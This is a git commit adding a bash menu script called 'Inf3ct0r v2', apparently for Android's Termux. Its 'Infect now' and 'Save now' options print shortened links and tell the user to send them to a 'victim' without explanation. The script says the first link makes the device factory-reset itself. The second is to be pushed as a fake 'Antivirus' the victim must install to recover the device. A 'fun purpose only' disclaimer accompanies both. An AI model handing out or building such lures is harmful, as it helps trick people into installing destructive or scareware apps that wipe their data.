a318bf8b53076bf436c503b80636fbed19d53724
Astro <100206062+xAstroDev@users.noreply.github.com>
2022-08-15 22:25:10 +0200

    Add files via upload

---
+++ INF3CT0Rv1/infect.sh
@@ -0,0 +1,323 @@
+# Be a unique person not copy cat
+# Colours
+#-----------------
+red="\e[91m"
+rset="\e[0m"
+grn="\e[92m"
+ylo="\e[93m"
+blue="\e[94m"
+cyan="\e[96m"
+pink="\e[95m"
+#-----------------
+# scripting start
+banner(){
+vid
+echo -e '\e[93m               
+                         __________
+                      .~#########%%;~.
+                     /############%%;`\
+                    /######/~\/~\%%;,;,\
+                   |#######\    /;;;;.,.|
+                   |#########\/%;;;;;.,.|
+          XX       |##/~~\####%;;;/~~\;,|       XX
+        XX..X      |#|  o  \##%;/  o  |.|      X..XX
+      XX.....X     |##\____/##%;\____/.,|     X.....XX
+ XXXXX.....XX      \#########/\;;;;;;,, /      XX.....XXXXX
+X |......XX%,.@      \######/%;\;;;;, /      @#%,XX......| X
+X |.....X  @#%,.@     |######%%;;;;,.|     @#%,.@  X.....| X'
+echo -e '\e[92mX  \...X     @#%,.@   ----------------    @ @ 00 0 xxxxxxxxx
+ X# \.X        @#%,.@   Inf3ct0r v2      @#%,.@        
+                @#%,.@              @#%,.@          
+                  @#%,.@          @#%,.@            
+                     @#%,.@      @#%,.@             
+                       @#%.,@  @#%,.@              
+                        C0DE BREAK3RZ
+'
+echo " " 
+echo -e "$red                       ▶Coded by$grn ASTRO$red◀$rset"
+echo -e "$red                      ⫸$ylo  C0DE BREAK3RZ$red ⫷$rset"
+echo 
+# Functions
+echo -e "$red            [CB ON TOP!]$rset"
+echo " "
+echo " "
+}
+baner1(){
+clear
+echo -e '\e[93m               
+                         __________
+                      .~#########%%;~.
+                     /############%%;`\
+                    /######/~\/~\%%;,;,\
+                   |#######\    /;;;;.,.|
+                   |#########\/%;;;;;.,.|
+          XX       |##/~~\####%;;;/~~\;,|       XX
+        XX..X      |#|  o  \##%;/  o  |.|      X..XX
+      XX.....X     |##\____/##%;\____/.,|     X.....XX
+ XXXXX.....XX      \#########/\;;;;;;,, /      XX.....XXXXX
+X |......XX%,.@      \######/%;\;;;;, /      @#%,XX......| X
+X |.....X  @#%,.@     |######%%;;;;,.|     @#%,.@  X.....| X'
+echo -e '\e[92mX  \...X     @#%,.@   ----------------    @ @ 00 0 xxxxxxxxx
+ X# \.X        @#%,.@   Inf3ct0r v2      @#%,.@        
+                @#%,.@              @#%,.@          
+                  @#%,.@          @#%,.@            
+                     @#%,.@      @#%,.@             
+                       @#%.,@  @#%,.@              
+                        C0DE BREAK3RZ
+'
+echo " " 
+echo -e "$red                       ▶Coded by$grn ASTRO$red◀$rset"
+echo -e "$red                      ⫸$ylo  C0DE BREAK3RZ$red ⫷$rset"
+echo 
+# Functions
+echo -e "$red           [CB ON TOP]$rset"
+echo " "
+echo " "
+}
+menu(){
+echo -e "$grn ＞＞＞＞>>>＞$ylo [Options]$grn ＜<<<＜＜＜＜$rset"
+echo " "
+echo " "
+echo -e "$red                        ➡$cyan [\e[92m1\e[96m] Infect now"
+echo -e "$red                        ➡$cyan [\e[92m2\e[96m] Save now"
+echo -e "$red                        ➡$cyan [\e[92m3\e[96m] About"
+echo -e "$red                        ➡$cyan [\e[92m4\e[96m] Update script "
+echo -e "$red                        ➡$cyan [\e[92m5\e[96m] Subscribe"
+echo -e "$red                        ➡$cyan [\e[92m6\e[96m] More"
+echo -e "$red                        ➡$cyan [\e[92m7\e[96m] Chat"
+echo -e "$red                        ➡$cyan [\e[92m8\e[96m] Exit"
+echo " "
+echo " "
+echo -e "$grn>＞＞＞＞＞$ylo [SELECT]$grn ＜＜＜＜＜<$rset"
+echo " "
+echo -ne "\e[92m#SELECT OPTION\e[92m: "
+read optnz
+if [ $optnz = "1" ];
+then
+virus
+elif [ $optnz = "2" ];
+then
+save
+elif [ $optnz = "3" ];
+then
+about
+elif [ $optnz = "4" ];
+then
+upd
+elif [ $optnz = "5" ];
+then
+am start -a android.intent.action.VIEW -d  > /dev/null 2>&1
+banner
+menu
+elif [ $optnz = "6" ];
+then
+am start -a android.intent.action.VIEW -d  > /dev/null 2>&1
+banner
+menu
+elif [ $optnz = "7" ];
+then
+am start -a android.intent.action.VIEW -d  > /dev/null 2>&1
+banner
+menu
+elif [ $optnz = "8" ];
+then
+exit 1
+else
+echo "wrong"
+exit
+fi
+}
+virus(){
+################
+clear
+echo
+echo -e '\e[92m 
+
+╔══╦═╗─╔╦═══╦═══╦═══╦════╦═══╦═══╗
+╚╣╠╣║╚╗║║╔══╣╔═╗║╔═╗║╔╗╔╗║╔═╗║╔═╗║
+─║║║╔╗╚╝║╚══╬╝╔╝║║─╚╩╝║║╚╣║║║║╚═╝║
+─║║║║╚╗║║╔══╬╗╚╗║║─╔╗─║║─║║║║║╔╗╔╝
+╔╣╠╣║─║║║║──║╚═╝║╚═╝║─║║─║╚═╝║║║╚╗
+╚══╩╝─╚═╩╝──╚═══╩═══╝─╚╝─╚═══╩╝╚═╝ '
+echo " "
+echo -e "\e[91m 😈  Copy below link and send it your victim and 
+say nothing to him. when he installs it on his 
+device it will factory reset itself and alot more happens.
+                                👇👇👇
+
+         \e[92mL1NK :- \e[96mhttps://bit.ly/3ild93L\e[91m
+
+                                 👆👆👆
+Use only for fun purpose not for harming someone 😇✌️.
+And our channel is not responsible for any kind of loss 
+you do to other's by this script."
+echo
+echo -ne "\e[92m#Type exit : "
+read exitz
+if [ $exitz = "exit" ];
+then
+banner
+menu
+else
+banner
+menu
+fi
+}
+save(){
+clear
+echo
+echo -e '\e[92m 
+
+╔══╦═╗─╔╦═══╦═══╦═══╦════╦═══╦═══╗
+╚╣╠╣║╚╗║║╔══╣╔═╗║╔═╗║╔╗╔╗║╔═╗║╔═╗║
+─║║║╔╗╚╝║╚══╬╝╔╝║║─╚╩╝║║╚╣║║║║╚═╝║
+─║║║║╚╗║║╔══╬╗╚╗║║─╔╗─║║─║║║║║╔╗╔╝
+╔╣╠╣║─║║║║──║╚═╝║╚═╝║─║║─║╚═╝║║║╚╗
+╚══╩╝─╚═╩╝──╚═══╩═══╝─╚╝─╚═══╩╝╚═╝ '
+echo " "
+echo " "
+echo -e "\e[93m  Copy the link below and send it your victim and tell him
+that he should install this application or else his 
+device will not be recovered.(Antivirus)
+                    👇👇👇
+
+        \e[92mL1NK :- \e[96mhttps://bit.ly/3fX8ljZ\e[93m
+
+                    👆👆👆
+Use only for fun purpose not for harming someone 😇✌️. 
+And our team is not and will not be responsible for any kind of 
+harm you do to other's by this script."
+echo
+echo -ne "\e[92m#Type exit : "
+read exitz
+if [ $exitz = "exit" ];
+then
+banner
+menu
+else
+banner
+menu
+fi
+}
+about(){
+clear
+echo -e '\e[91m
+
+⠀⠀⠀⠀⠀⠀⠀⣀⣤⣴⣶⣶⣶⣿⣿⣿⣷⣶⣶⣶⣤⣄⠀⠀⠀⠀⠀⠀⠀⠀
+⠀⠀⠀⠀⠀⣠⣾⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣶⣤⡀⠀⠀⠀⠀
+⠀⠀⠀⣠⣾⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣄⠀⠀⠀
+⠀⣠⣾⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣷⡀⠀
+⢰⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣷⡀
+⣾⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣇
+⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿
+⣿⣿⡏⠉⠙⠿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠿⠋⠉⠉⣿⣿
+⢻⣿⡇⠀⠀⠀⠈⠙⠻⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠟⠋⠀⠀⠀⠀⢀⣿⡇
+⠘⣿⣷⡀⠀⠀⠀⠀⠀⠀⠉⠛⠿⢿⣿⣿⣿⠿⠛⠋⠀⠀⠀⠀⠀⠀⢀⣼⣿⠃
+⠀⠹⣿⣿⣶⣦⣤⣀⣀⣀⣀⣀⣤⣶⠟⡿⣷⣦⣄⣀⣀⣀⣠⣤⣤⣶⣿⣿⡟⠀
+⠀⠀⣨⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠏⠀⡇⠸⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠃⠀
+⠀⢈⣿⣿⣿⣿⣿⡿⠿⠿⣿⣿⣷⠀⣼⣷⠀⣸⣿⣿⣿⡿⠿⠿⠿⣿⣿⣿⡇⠀
+⠀⠘⣿⣿⣿⡟⠋⠀⠀⠰⣿⣿⣿⣷⣿⣿⣷⣿⣿⣿⣿⡇⠀⠀⠀⣿⣿⠟⠁⠀
+⠀⠀⠈⠉⠀⠈⠁⠀⠀⠘⣿⣿⢿⣿⣿⢻⣿⡏⣻⣿⣿⠃⠀⠀⠀⠈⠀⠀⠀⠀
+⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣿⣿⡇⣿⣿⢸⣿⡇⣿⣿⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀
+⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣿⣿⡇⣿⣿⢸⣿⡇⣿⣿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
+⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⣿⡇⣿⣿⢸⣿⡇⣿⣿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
+⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⣿⡇⣿⣿⢸⣿⠃⣿⣿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
+⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠸⣿⡇⣿⣿⢸⣿⠀⣿⣿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
+⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠿⠇⢿⡿⢸⡿⠀⠿⠟⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
+
+               '
+echo -e "\e[93m                  MY NAME IS \e[92mASTRO" | pv -qL 10
+echo -e "\e[93m             IAM FROM \e[92mC0DE BRAK3RZ" | pv -qL 10
+echo -e "\e[93m       IM A \e[92mGEEK\e[93m PLEASE DO NOT MISUSE THIS SCRIPT I DO NOT HOLD ANY RESPONSIBILTY FOR YOUR USE OF THIS SCRIPT [EDUCATIONAL PURPOSES ONLY] " | pv -qL 10
+echo -e "\e[93m             HOPE YOU LIKE THIS! " | pv -qL 10
+echo -e "\e[93m         OOPS... I TALK A LOT SRY FOR THAT " | pv -qL 10
+echo -e "\e[93m              GROUPS \e[92mCOMING SOON" | pv -qL 10
+echo -e "\e[93m        WEBSITE:\e[92m COMING SOON\e[0m" | pv -qL 10
+
+echo -e "\e[92m                G00DBYE" | pv -qL 10
+
+echo -e "\e[92m                EXITING.............." | pv -qL 10
+sleep 6.0
+banner
+menu
+}
+upd(){
+if [ -d "$HOME/infect" ];
+then
+cd $HOME
+rm -rf infect
+elif [ -d "$HOME/Infect" ];
+then
+cd $HOME
+rm -rf Infect
+else
+echo
+exit 1
+fi
+cd $HOME
+sleep 1
+echo -e "         \e[96mUPDATE IS GOING ON, PLEASE WAIT FOR A WHILE...!\e[0m"
+echo
+printf "                     \e[96m["
+# While process is running...
+while git clone https://github.com/noob-hackers/infect 2> /dev/null; do 
+    printf  "\e[92m▓▓▓▓▓▓▓▓▓▓▓▓▓\e[0m"
+    sleep 1
+done
+printf "\e[96m]\e[0m"
+echo
+echo
+echo
+printf "\e[96m           UPDATE SUCCESSFULL (LATEST VERSION)..!\e[0m"
+sleep 2.0
+cd $HOME
+cd infect
+bash infect.sh
+}
+vid(){
+FILE=$HOME/infect/noob.noob
+if [ -f "$FILE" ]; then
+pop
+else
+echo
+fi
+}
+pop(){
+clear
+#echo -e "\e[96m                ╔═══════════════════════════════════╗\e[0m"
+#echo -e "\e[96m                ║  \e[93mHAI, I JUST UPLOADED NEW\e[96m VIDEO   ║\e[0m"
+#echo -e "\e[96m                ║      WATCH NEW VIDEO NOW.....!    ║\e[0m"
+#echo -e "\e[96m                ║                                   ║\e[0m"
+#echo -e "\e[96m                ║        Select \e[92my\e[96m to watch\e[96m          ║\e[0m"
+#echo -e "\e[96m                ║                (\e[93mOR\e[96m)               \e[96m║\e[0m"
+#echo -e "\e[96m                ║        Select \e[91mt\e[96m to cancel\e[96m         ║\e[0m"
+#echo -e "\e[96m                ║                (\e[93mOR\e[96m)               \e[96m║\e[0m"
+#echo -e "\e[96m                ║     Select \e[91mz\e[96m to skipforever\e[96m       ║\e[0m"
+#echo -e "\e[96m                ╚═══════════════════════════════════╝\e[0m"
+#echo -en "\e[32mSELECT OPTION [\e[93my/\e[93mt/\e[32m\e[93mz\e[32m]: \e[0m "
+read p
+if [ "$p" = "y" ];
+then
+#am start -a android.intent.action.VIEW -d https://noobhacktube.com 2>/dev/null
+clear
+baner1
+menu
+elif [ "$p" = "t" ];
+then
+clear
+baner1
+menu
+elif [ "$p" = "z" ];
+then
+cd $HOM/infect
+rm noob.noob
+banner
+menu
+else
+banner
+menu
+exit
+fi
+}
+banner
+menu
